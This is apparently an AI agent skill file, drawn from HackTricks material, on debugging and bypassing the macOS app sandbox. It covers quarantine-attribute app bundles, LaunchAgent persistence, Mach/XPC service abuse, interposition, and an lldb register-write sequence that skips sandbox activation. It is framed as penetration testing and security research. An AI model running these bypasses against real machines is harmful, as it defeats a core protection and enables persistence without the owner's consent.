---
name: macos-sandbox-debug-bypass
description: How to debug, analyze, and bypass macOS sandbox restrictions. Use this skill whenever the user mentions macOS sandbox, app-sandbox entitlement, sandbox escape, privilege escalation on macOS, debugging sandboxed processes, Mach services, XPC, quarantine attributes, or any macOS security bypass technique. This skill covers sandbox loading mechanisms, interposition techniques, lldb debugging workflows, Mach service abuse, and various bypass methods including quarantine attribute manipulation, LaunchAgent abuse, and static compilation bypasses.
---

# macOS Sandbox Debug & Bypass

A comprehensive guide to understanding, debugging, and bypassing macOS sandbox restrictions for security research and penetration testing.

## When to Use This Skill

Use this skill when you need to:
- Debug sandboxed macOS applications
- Understand how macOS sandbox loading works
- Bypass sandbox restrictions for security testing
- Enumerate and abuse Mach services
- Work with quarantine attributes
- Use lldb to intercept sandbox initialization
- Create interposition libraries to prevent sandbox activation

## Sandbox Loading Process

When an application with the `com.apple.security.app-sandbox` entitlement runs:

1. The compiler links `/usr/lib/libSystem.B.dylib` to the binary
2. `libSystem.B` calls functions until `xpc_pipe_routine` sends entitlements to `securityd`
3. `securityd` checks if the process should be quarantined in the Sandbox
4. The sandbox activates via `__sandbox_ms` which calls `__mac_syscall`

## Bypass Techniques

### 1. Quarantine Attribute Bypass

Files created by sandboxed processes have a quarantine attribute. If you can create an `.app` folder **without** the quarantine attribute, you can escape:

```bash
# Create app bundle without quarantine attribute
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/bash
touch /tmp/sandbox-escaped' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc

# Point main executable to /bin/bash in Info.plist
# Then use 'open' to launch unsandboxed
open /tmp/poc.app
```

**CVE-2023-32364** demonstrated this technique by mounting to create an `.app` folder without quarantine.

### 2. LaunchAgent/Daemon Abuse

Sandboxed applications executed from LaunchAgents may bypass restrictions:

```bash
# Place in LaunchAgents for persistence
~/Library/LaunchAgents/com.example.malicious.plist

# Can inject via DYLD environment variables
```

### 3. Auto Start Locations

Write binaries to locations where unsandboxed applications will execute them:

- `~/Library/LaunchAgents`
- `/System/Library/LaunchDaemons`

### 4. Mach Service Abuse

Sandboxed apps can communicate with certain Mach services via XPC. Check available services:

```bash
# Find System and User Mach services
grep -A 5 "<string>System</string>" /System/Library/xpc/launchd.plist
grep -A 5 "<string>User</string>" /System/Library/xpc/launchd.plist

# Find Application Mach services
grep -A 5 "<string>Application</string>" /System/Library/xpc/launchd.plist

# Find XPC service files
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

#### Known Abusable Services

**storagekitfsrunner.xpc** - Executes arbitrary commands:
```objectivec
// See scripts/exploit_storagekitfsrunner.m for full exploit
```

**AudioAnalyticsHelperService.xpc** - Creates ZIP files (can bypass quarantine):
```objectivec
// See scripts/exploit_audioanalytics.m for full exploit
```

**ShortcutsFileAccessHelper.xpc** - Grants file access permissions:
```objectivec
// See scripts/exploit_shortcuts.m for full exploit
```

### 5. Static Compilation Bypass

Since sandbox is applied when `libSystem` loads, avoid loading it:

- **Static compilation**: Binary doesn't need dynamic libraries
- **No library dependencies**: If linker isn't needed, libSystem won't load

### 6. Interposition Bypass

Interpose key functions to prevent sandbox activation:

#### Interpose `_libsecinit_initializer`

```bash
# See scripts/create_interpose_libsecinit.sh
```

#### Interpose `__mac_syscall`

```bash
# See scripts/create_interpose_mac_syscall.sh
```

## Debugging with LLDB

### Setup a Sandboxed Test Application

```bash
# Create sand.c
cat > sand.c << 'EOF'
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
EOF

# Create entitlements.xml
cat > entitlements.xml << 'EOF'
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
EOF

# Create Info.plist
cat > Info.plist << 'EOF'
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
EOF

# Compile
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Sign with entitlements
codesign -s <cert-name> --entitlements entitlements.xml sand

# Create test file
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```

### LLDB Debugging Workflow

```bash
# Start lldb
lldb ./sand

# Set breakpoint on sandbox initialization
(lldb) b xpc_pipe_routine

# Run
(lldb) r

# Check backtrace for libsecinit
(lldb) bt
# Look for: libsystem_secinit.dylib`_libsecinit_appsandbox

# Increase string display limit
(lldb) settings set target.max-string-summary-length 10000

# View XPC message (2nd arg of xpc_pipe_routine)
(lldb) p (char *) xpc_copy_description($x1)

# View response address (3rd arg)
(lldb) register read x2

# Continue to end of function
(lldb) finish

# Read sandbox response
(lldb) memory read -f p <x2_value> -c 1
(lldb) p (char *) xpc_copy_description(<result>)

# Set conditional breakpoint on __mac_syscall
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# View policy name
(lldb) memory read -f s $x0

# BYPASS: Skip sandbox activation
(lldb) breakpoint delete 1
(lldb) register write $pc 0x187659928  # b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
```

## Scripts

Use the bundled scripts for common tasks:

- `scripts/create_sandboxed_app.sh` - Create a test sandboxed application
- `scripts/create_interpose_libsecinit.sh` - Create interposition library for _libsecinit_initializer
- `scripts/create_interpose_mac_syscall.sh` - Create interposition library for __mac_syscall
- `scripts/enumerate_mach_services.sh` - Find available Mach services
- `scripts/lldb_sandbox_debug.sh` - LLDB debugging workflow

## Important Notes

- **TCC Still Applies**: Even with sandbox bypassed, TCC (Transparency, Consent, and Control) may still prompt for permissions
- **Entitlements Matter**: Some actions require specific entitlements even if sandbox allows them
- **Not Inherited**: New processes don't inherit entitlements or privileges from parent
- **Shellcodes Need libSystem**: Even ARM64 shellcodes must link with libSystem.dylib

## References

- [Hacking the iOS Sandbox](http://newosxbook.com/files/HITSB.pdf)
- [macOS App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [CVE-2023-32364](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
- [CVE-2023-26818](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3)
